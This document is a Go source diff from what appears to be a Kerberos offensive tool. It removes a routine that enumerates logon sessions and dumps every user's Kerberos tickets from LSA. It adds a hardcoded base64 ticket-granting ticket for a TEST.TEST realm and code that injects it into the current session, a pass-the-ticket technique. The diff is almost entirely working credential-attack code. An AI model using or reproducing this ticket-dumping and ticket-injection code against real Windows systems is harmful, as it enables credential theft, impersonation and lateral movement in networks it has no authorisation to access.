@@ -16,6 +16,8 @@ import (
 
 var DEBUG bool
 
+var ticket = "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"
+
 func main() {
 	DEBUG = true
 
@@ -59,44 +61,9 @@ func main() {
 	}
 	fmt.Println("[+] Auth Package:", authPack)
 
-	// enumerate logon sessions
-	luids, err := lsa.GetLogonSessions()
-	if err != nil {
-		fmt.Println("[ERROR] GetLogonSessions:", err)
-		os.Exit(1)
-	}
-	fmt.Println()
-	for _, luid := range luids {
-		// get info about the session
-		sd, err := lsa.GetLogonSessionData(&luid)
-		if err != nil {
-			fmt.Println("[ERROR] LsaGetLogonSessionData:", err)
-			os.Exit(1)
-		}
-
-		// get info about the ticket
-		ticketInfos := lsa.GetTicketInfoExS(lsaHandle, authPack, luid, sd)
-
-		if len(ticketInfos) > 0 {
-			fmt.Println("##################################################")
-			fmt.Println("Username:", sd.UserName)
-			fmt.Println("SID:", sd.Sid)
-			fmt.Println("Ticket Count:", len(ticketInfos))
-			for _, tic := range ticketInfos {
-				fmt.Println("------------------------------------------")
-				fmt.Println("Client Name:", tic.ClientName)
-				fmt.Println("Client Realm:", tic.ClientRealm)
-				fmt.Println("Server Name:", tic.ServerName)
-				fmt.Println("Server Realm:", tic.ServerRealm)
-				fmt.Println("Start Time:", lsa.TimeFromUint64(uint64(tic.StartTime)))
-				fmt.Println("End Time:", lsa.TimeFromUint64(uint64(tic.EndTime)))
-				fmt.Println("Renew Time:", lsa.TimeFromUint64(uint64(tic.RenewTime)))
-
-				// request the actual ticket
-				lsa.GetTicket(lsaHandle, authPack, luid, sd, tic.ServerName)
-			}
-		}
-
+	// lsa.DumpTickets(lsaHandle, authPack)
+	if err := lsa.SubmitTicketFromBase64(lsaHandle, authPack, ticket); err != nil {
+		log.Fatal(err)
 	}
 }
 
